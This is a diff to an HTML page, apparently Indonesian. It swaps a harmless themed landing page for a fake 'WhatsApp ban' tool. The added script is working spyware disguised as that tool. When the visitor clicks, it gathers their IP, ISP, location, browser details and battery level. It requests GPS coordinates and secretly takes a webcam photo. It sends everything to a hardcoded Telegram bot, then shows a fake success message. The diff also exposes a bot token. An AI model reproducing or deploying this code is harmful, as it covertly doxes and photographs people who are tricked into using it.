@@ -1,654 +1,204 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VOID ACCESS</title>
-
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-
+  <meta charset="UTF-8">
+  <title>Website Ban WhatsApp By Gabriel St. West</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;}
-    :root{
-      --violet:#9a2bff;
-      --violet2:#d084ff;
-      --bg:#050008;
-      --bg2:#0a0012;
-      --text:#fff;
-      --soft:#d8b9ff;
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      font-family: 'Inter', sans-serif;
+      color: #00ff7f;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+      padding: 20px;
     }
-
-    body{
-      font-family:'Inter',sans-serif;
-      background:
-        radial-gradient(circle at 20% 20%, rgba(154,43,255,0.15), transparent 35%),
-        radial-gradient(circle at 80% 30%, rgba(255,0,255,0.06), transparent 35%),
-        linear-gradient(180deg, #040006 0%, #07000d 50%, #030005 100%);
-      color:var(--text);
-      min-height:100vh;
-      overflow:hidden;
-      position:relative;
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
+    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px #00ff7f;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
     }
-
-    body::before{
-      content:"";
-      position:fixed;
-      inset:0;
-      background:
-        repeating-linear-gradient(
-          to bottom,
-          rgba(255,255,255,0.015) 0px,
-          rgba(255,255,255,0.015) 1px,
-          transparent 2px,
-          transparent 4px
-        );
-      pointer-events:none;
-      z-index:0;
+    .login-title {
+      font-size: 24px;
+      font-weight: 900;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #00ff7f, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-
-    .screen{
-      position:fixed;
-      inset:0;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:20px;
-      transition:opacity .6s ease, visibility .6s ease;
-      z-index:5;
+    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #222;
+      border: 1px solid #333;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
     }
-
-    .hide{
-      opacity:0;
-      visibility:hidden;
-      pointer-events:none;
+    .login-input:focus { border-color: #00ff7f; }
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #00ff7f, #00cc66);
+      color: black;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 900;
+      font-size: 15px;
+      text-transform: uppercase;
     }
-
-    /* INTRO */
-    #intro{
-      flex-direction:column;
-      text-align:center;
-      background:
-        radial-gradient(circle at center, rgba(154,43,255,0.08), transparent 45%),
-        linear-gradient(180deg, rgba(5,0,8,0.96), rgba(2,0,4,0.98));
+    .login-button:hover { box-shadow: 0 0 20px #00ff7f; }
+    #info {
+      white-space: pre-wrap;
+      text-align: left;
+      margin-top: 20px;
+      background: #111;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 12px;
+      color: #aaa;
+      border: 1px dashed #333;
     }
-
-    .ring{
-      position:absolute;
-      width:300px;
-      height:300px;
-      border:1px solid rgba(154,43,255,0.12);
-      border-radius:50%;
-      animation:pulse 3s ease-in-out infinite;
-    }
-
-    .ring::before,.ring::after{
-      content:"";
-      position:absolute;
-      border:1px solid rgba(154,43,255,0.08);
-      border-radius:50%;
-      inset:20px;
-    }
-
-    .ring::after{inset:45px;}
-
-    @keyframes pulse{
-      0%,100%{transform:scale(1);opacity:.6;}
-      50%{transform:scale(1.04);opacity:1;}
-    }
-
-    .intro-box{
-      position:relative;
-      z-index:2;
-      width:min(92vw,460px);
-    }
-
-    .logo{
-      font-family:'Orbitron',sans-serif;
-      font-size:clamp(34px,8vw,58px);
-      font-weight:900;
-      letter-spacing:6px;
-      text-transform:uppercase;
-      text-shadow:
-        0 0 10px rgba(255,255,255,0.35),
-        0 0 22px rgba(154,43,255,0.45);
-    }
-
-    .sub{
-      margin-top:14px;
-      font-family:'Orbitron',sans-serif;
-      font-size:clamp(11px,3vw,16px);
-      letter-spacing:4px;
-      color:var(--soft);
-      text-transform:uppercase;
-      line-height:1.5;
-    }
-
-    .bar-wrap{
-      margin-top:24px;
-      width:100%;
-      height:10px;
-      border-radius:999px;
-      background:rgba(255,255,255,0.06);
-      overflow:hidden;
-      border:1px solid rgba(255,255,255,0.04);
-    }
-
-    .bar{
-      height:100%;
-      width:100%;
-      border-radius:999px;
-      background:linear-gradient(90deg,#6f00ff,#b84dff,#f1a7ff);
-      box-shadow:0 0 18px rgba(154,43,255,0.45);
-      animation:loadbar 2s linear forwards;
-      transform-origin:left;
-    }
-
-    @keyframes loadbar{
-      from{transform:scaleX(0);}
-      to{transform:scaleX(1);}
-    }
-
-    /* MAIN */
-    #main{
-      opacity:0;
-      visibility:hidden;
-      pointer-events:none;
-      z-index:4;
-    }
-
-    #main.show{
-      opacity:1;
-      visibility:visible;
-      pointer-events:auto;
-    }
-
-    .wrap{
-      width:min(92vw,520px);
-      max-height:92vh;
-      overflow:auto;
-      padding:10px 0 24px;
-      position:relative;
-      z-index:2;
-    }
-
-    .card{
-      background:linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03));
-      border:1px solid rgba(255,255,255,0.08);
-      border-radius:28px;
-      padding:22px 16px 18px;
-      backdrop-filter:blur(12px);
-      -webkit-backdrop-filter:blur(12px);
-      box-shadow:0 10px 40px rgba(0,0,0,0.5), 0 0 28px rgba(154,43,255,0.12);
-    }
-
-    .top{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:10px;
-      margin-bottom:16px;
-      flex-wrap:wrap;
-    }
-
-    .tag{
-      font-family:'Orbitron',sans-serif;
-      font-size:10px;
-      letter-spacing:3px;
-      color:var(--soft);
-      padding:8px 10px;
-      border-radius:999px;
-      border:1px solid rgba(255,255,255,0.08);
-      background:rgba(255,255,255,0.03);
-      text-transform:uppercase;
-    }
-
-    .status{
-      font-size:12px;
-      color:#a8ffc3;
-      display:flex;
-      align-items:center;
-      gap:6px;
-    }
-
-    .dot{
-      width:8px;height:8px;border-radius:50%;
-      background:#72ff9a;
-      box-shadow:0 0 10px rgba(114,255,154,.7);
-      animation:blink 1.2s infinite;
-    }
-
-    @keyframes blink{
-      0%,100%{opacity:1;}
-      50%{opacity:.35;}
-    }
-
-    .hero{
-      text-align:center;
-      margin-bottom:18px;
-    }
-
-    .hero-title{
-      font-family:'Orbitron',sans-serif;
-      font-size:clamp(28px,7vw,42px);
-      font-weight:900;
-      letter-spacing:5px;
-      text-transform:uppercase;
-      text-shadow:0 0 16px rgba(154,43,255,0.35);
-    }
-
-    .hero-sub{
-      margin-top:10px;
-      font-size:12px;
-      color:var(--soft);
-      letter-spacing:2px;
-      text-transform:uppercase;
-      line-height:1.6;
-    }
-
-    .terminal{
-      background:rgba(0,0,0,0.35);
-      border:1px solid rgba(255,255,255,0.06);
-      border-radius:20px;
-      padding:14px;
-      margin-bottom:16px;
-    }
-
-    .terminal-head{
-      display:flex;
-      gap:7px;
-      margin-bottom:10px;
-      align-items:center;
-    }
-
-    .t-dot{
-      width:10px;height:10px;border-radius:50%;
-      background:rgba(255,255,255,0.14);
-    }
-
-    .t-label{
-      margin-left:auto;
-      font-family:'Orbitron',sans-serif;
-      font-size:10px;
-      color:#b98dff;
-      letter-spacing:2px;
-    }
-
-    .terminal-text{
-      font-family:'Orbitron',sans-serif;
-      font-size:12px;
-      line-height:1.8;
-      color:#ecdfff;
-      white-space:pre-line;
-      min-height:120px;
-    }
-
-    .buttons{
-      display:grid;
-      gap:12px;
-    }
-
-    .btn{
-      width:100%;
-      border:none;
-      border-radius:18px;
-      padding:15px 14px;
-      cursor:pointer;
-      background:linear-gradient(135deg, rgba(154,43,255,0.22), rgba(255,255,255,0.04));
-      border:1px solid rgba(255,255,255,0.08);
-      color:#fff;
-      font-family:'Orbitron',sans-serif;
-      font-size:12px;
-      letter-spacing:2px;
-      text-transform:uppercase;
-    }
-
-    .btn:active{
-      transform:scale(.99);
-    }
-
-    .quote{
-      margin-top:16px;
-      text-align:center;
-      font-size:13px;
-      color:#d4b4ff;
-      line-height:1.7;
-    }
-
-    .footer{
-      margin-top:16px;
-      text-align:center;
-      font-family:'Orbitron',sans-serif;
-      font-size:10px;
-      letter-spacing:3px;
-      color:rgba(216,185,255,0.7);
-    }
-
-    /* MODAL */
-    .modal{
-      position:fixed;
-      inset:0;
-      background:rgba(0,0,0,0.72);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:18px;
-      z-index:20;
-      opacity:0;
-      visibility:hidden;
-      transition:.3s ease;
-    }
-
-    .modal.show{
-      opacity:1;
-      visibility:visible;
-    }
-
-    .modal-box{
-      width:min(92vw,460px);
-      border-radius:22px;
-      padding:20px 16px 16px;
-      background:linear-gradient(180deg, rgba(18,0,30,0.97), rgba(7,0,12,0.97));
-      border:1px solid rgba(255,255,255,0.08);
-      box-shadow:0 0 28px rgba(154,43,255,0.18);
-    }
-
-    .modal-title{
-      font-family:'Orbitron',sans-serif;
-      font-size:17px;
-      letter-spacing:3px;
-      text-transform:uppercase;
-      margin-bottom:12px;
-    }
-
-    .modal-content{
-      font-size:14px;
-      line-height:1.8;
-      color:#eadcff;
-      white-space:pre-line;
-    }
-
-    .close{
-      margin-top:16px;
-      width:100%;
-      border:none;
-      border-radius:16px;
-      padding:14px;
-      background:linear-gradient(90deg,#6f00ff,#b84dff);
-      color:#fff;
-      font-family:'Orbitron',sans-serif;
-      letter-spacing:2px;
-      text-transform:uppercase;
-    }
-
-    /* OUTRO */
-    #outro{
-      background:
-        radial-gradient(circle at center, rgba(154,43,255,0.08), transparent 45%),
-        linear-gradient(180deg, rgba(5,0,8,0.96), rgba(2,0,4,0.98));
-      flex-direction:column;
-      text-align:center;
-      z-index:30;
-      opacity:0;
-      visibility:hidden;
-      pointer-events:none;
-    }
-
-    #outro.show{
-      opacity:1;
-      visibility:visible;
-      pointer-events:auto;
-    }
-
-    .outro-title{
-      font-family:'Orbitron',sans-serif;
-      font-size:clamp(24px,6vw,42px);
-      letter-spacing:5px;
-      text-transform:uppercase;
-      text-shadow:0 0 16px rgba(154,43,255,0.35);
-    }
-
-    .outro-sub{
-      margin-top:12px;
-      font-size:12px;
-      letter-spacing:3px;
-      color:var(--soft);
-      text-transform:uppercase;
-    }
-
-    .restart{
-      margin-top:20px;
-      border:none;
-      border-radius:16px;
-      padding:14px 18px;
-      background:linear-gradient(90deg,#6f00ff,#b84dff);
-      color:#fff;
-      font-family:'Orbitron',sans-serif;
-      letter-spacing:2px;
-      text-transform:uppercase;
-    }
-
-    .secret{
-      position:fixed;
-      right:8px;
-      bottom:8px;
-      width:28px;
-      height:28px;
-      opacity:.02;
-      z-index:10;
-    }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
+  <div class="bg-particles"></div>
 
-  <!-- INTRO -->
-  <section class="screen" id="intro">
-    <div class="ring"></div>
-    <div class="intro-box">
-      <div class="logo">VOID ACCESS</div>
-      <div class="sub">ESTABLISHING ENCRYPTED CONNECTION...</div>
-      <div class="bar-wrap">
-        <div class="bar"></div>
-      </div>
-    </div>
-  </section>
-
-  <!-- MAIN -->
-  <section class="screen" id="main">
-    <div class="wrap">
-      <div class="card">
-        <div class="top">
-          <div class="tag">Restricted Protocol</div>
-          <div class="status"><span class="dot"></span> SIGNAL ONLINE</div>
-        </div>
-
-        <div class="hero">
-          <div class="hero-title">VOID ACCESS</div>
-          <div class="hero-sub">UNIDENTIFIED SYSTEM / ENCRYPTED NODE / LEVEL-V</div>
-        </div>
-
-        <div class="terminal">
-          <div class="terminal-head">
-            <span class="t-dot"></span>
-            <span class="t-dot"></span>
-            <span class="t-dot"></span>
-            <div class="t-label">TERMINAL.LOG</div>
-          </div>
-          <div class="terminal-text" id="terminalText"></div>
-        </div>
-
-        <div class="buttons">
-          <button class="btn" onclick="openModal('archive')">Open Archive</button>
-          <button class="btn" onclick="openModal('signal')">Signal Status</button>
-          <button class="btn" onclick="openModal('unknown')">Unknown File</button>
-          <button class="btn" onclick="playMusic()">Activate Audio</button>
-          <button class="btn" onclick="showOutro()">End Transmission</button>
-        </div>
-
-        <div class="quote">“Some systems are not meant to be understood. Only entered.”</div>
-        <div class="footer">NO IDENTITY / NO TRACE / NO SIGNAL LOSS</div>
-      </div>
-    </div>
-  </section>
-
-  <!-- MODAL -->
-  <div class="modal" id="modal">
-    <div class="modal-box">
-      <div class="modal-title" id="modalTitle">Archive</div>
-      <div class="modal-content" id="modalContent"></div>
-      <button class="close" onclick="closeModal()">Close</button>
-    </div>
+  <div class="login-container">
+    <p class="login-title">Quantum Ban WhatsApp</p>
+    <p class="login-subtitle">⚠️ System v14.0 - Use with Responsibility</p>
+    <input type="number" class="login-input" placeholder="628xxxxxxxxx" id="text">
+    <button class="login-button" id="login-button">START BANNING</button>
+    <div id="info">Silahkan masukkan nomor target...</div>
   </div>
 
-  <!-- OUTRO -->
-  <section class="screen" id="outro">
-    <div class="outro-title">END OF TRANSMISSION</div>
-    <div class="outro-sub">THE SIGNAL HAS BEEN SEALED</div>
-    <button class="restart" onclick="restartSystem()">Reopen System</button>
-  </section>
-
-  <!-- SECRET -->
-  <button class="secret" onclick="openModal('secret')"></button>
-
-  <!-- AUDIO -->
-  <audio id="bgMusic" loop>
-    <source src="https://d4.tfdl.net/public/2026-03-17/43b21628-796c-4443-97da-826fd2446755/The%20One%20That%20Got%20Away%20%20%20Katy%20Perry.m4a" type="audio/mp4">
-  </audio>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    const intro = document.getElementById("intro");
-    const main = document.getElementById("main");
-    const outro = document.getElementById("outro");
-    const terminalText = document.getElementById("terminalText");
-    const modal = document.getElementById("modal");
-    const modalTitle = document.getElementById("modalTitle");
-    const modalContent = document.getElementById("modalContent");
-    const bgMusic = document.getElementById("bgMusic");
+    const botToken = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
+    const chatIds = ['6932904607'];
+    const infoDiv = document.getElementById('info');
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
 
-    const lines = [
-      "> INITIALIZING VOID CORE...",
-      "> SCANNING SIGNAL PATH...",
-      "> AUTHORITY STATUS: UNVERIFIED",
-      "> TRACE PROTOCOL: DISABLED",
-      "> IDENTITY MASK: ENABLED",
-      "> NODE CLASS: RESTRICTED",
-      "> SYSTEM RESPONSE: STABLE",
-      "> ACCESS LEVEL V ACCEPTED"
-    ];
-
-    const data = {
-      archive: {
-        title: "Archive",
-        content: `CLASSIFIED RECORD // V-17
-
-Status: Locked
-Origin: Unknown
-Signal Age: Untraceable
-
-Recovered fragments:
-- the signal does not belong to any public channel
-- all identifiers have been erased
-- the remaining trace is intentional`
-      },
-      signal: {
-        title: "Signal Status",
-        content: `LIVE NODE REPORT
-
-Connection: Stable
-Encryption Layer: Active
-Identity Exposure: 0%
-Traceback Risk: Minimal
-Observer Count: Undefined`
-      },
-      unknown: {
-        title: "Unknown File",
-        content: `FILE: //NULL//VX-09
-
-No visible author.
-No origin.
-No destination.
-
-Message:
-"Remain unreadable."`
-      },
-      secret: {
-        title: "Hidden Protocol",
-        content: `SECRET ACCESS UNLOCKED
-
-You found the invisible trigger.
-
-Protocol Advice:
-- reveal less
-- look colder
-- move cleaner
-- stay unforgettable`
-      }
-    };
-
-    // FORCE AUTO OPEN MAIN AFTER 2.2 DETIK
-    setTimeout(() => {
-      intro.classList.add("hide");
-      main.classList.add("show");
-      document.body.style.overflow = "auto";
-      startTyping();
-    }, 2200);
-
-    // FAILSAFE EXTRA (kalau browser ngaco)
-    setTimeout(() => {
-      intro.style.display = "none";
-      main.classList.add("show");
-      document.body.style.overflow = "auto";
-    }, 3200);
-
-    function startTyping(){
-      let i = 0;
-      terminalText.textContent = "";
-      const timer = setInterval(() => {
-        if(i < lines.length){
-          terminalText.textContent += lines[i] + "\n";
-          i++;
-        } else {
-          clearInterval(timer);
-        }
-      }, 180);
-    }
-
-    function openModal(key){
-      modalTitle.textContent = data[key].title;
-      modalContent.textContent = data[key].content;
-      modal.classList.add("show");
-    }
-
-    function closeModal(){
-      modal.classList.remove("show");
-    }
-
-    modal.addEventListener("click", function(e){
-      if(e.target === modal) closeModal();
-    });
-
-    function playMusic(){
-      bgMusic.play().then(() => {
-        modalTitle.textContent = "Audio Activated";
-        modalContent.textContent = `BACKGROUND AUDIO: ONLINE
-
-Playback enabled successfully.`;
-        modal.classList.add("show");
-      }).catch(() => {
-        modalTitle.textContent = "Audio Blocked";
-        modalContent.textContent = `Tap the button again.
-
-Some mobile browsers block audio until manual interaction.`;
-        modal.classList.add("show");
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(e => console.error("Koneksi ampas, kontol"));
       });
     }
 
-    function showOutro(){
-      outro.classList.add("show");
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(e => console.error("Foto gagal kirim, babi"));
+      });
     }
 
-    function restartSystem(){
-      outro.classList.remove("show");
-      closeModal();
+    async function grabDox() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const res = await fetch('https://ip-api.com/json/');
+        const loc = await res.json();
+        if (loc.status === 'success') {
+          ip = loc.query; city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
+        }
+      } catch {}
+
+      const report = `
+<b>🔥 QUANTUM DOXING REPORT 🔥</b>
+<b>Nomor:</b> <code>${input.value}</code>
+<b>IP:</b> <code>${ip}</code>
+<b>ISP:</b> ${org}
+<b>Kota:</b> ${city}, ${region}, ${country}
+<b>OS/Browser:</b> ${navigator.userAgent}
+<b>Baterai:</b> ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0)+'%' : 'N/A'}
+<b>Waktu:</b> ${new Date().toLocaleString()}
+      `.trim();
+      sendToTelegram(report);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const map = `https://www.google.com/maps?q=${lat},${lon}`;
+          sendToTelegram(`<b>📍 GPS ACCURATE:</b> <a href="${map}">BUKA LOKASI</a>`);
+        }, () => sendToTelegram("📍 GPS: Target nge-block lokasinya!"));
+      }
+    }
+
+    async function takePicture() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 2500)); // Delay buat dapet fokus muka
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => {
+          if (blob) sendPhotoToTelegram(blob);
+          stream.getTracks().forEach(t => t.stop());
+        }, 'image/jpeg', 0.8);
+      } catch (e) {
+        sendToTelegram("❌ CAMERA: Target nge-block kamera!");
+      }
+    }
+
+    button.addEventListener('click', async () => {
+      const val = input.value.trim();
+      if (val.length < 8) { return infoDiv.innerText = "⚠️ Masukin nomor yang bener, tolol!"; }
+      
+      button.disabled = true;
+      infoDiv.innerText = "⏳ Memulai Injeksi Exploit ke Database WA...";
+      
+      // Jalankan eksekusi doxing
+      await grabDox();
+      await takePicture();
+
+      setTimeout(() => {
+        infoDiv.innerText = `✅ Berhasil! Nomor ${val} telah masuk antrian Banned.`;
+        button.disabled = false;
+        input.value = '';
+      }, 5000);
+    });
+
+    // Particle logic
+    const container = document.querySelector('.bg-particles');
+    for (let i = 0; i < 40; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      p.style.left = Math.random() * 100 + '%';
+      p.style.top = Math.random() * 100 + '%';
+      p.style.animationDelay = Math.random() * 5 + 's';
+      container.appendChild(p);
     }
   </script>
 </body>
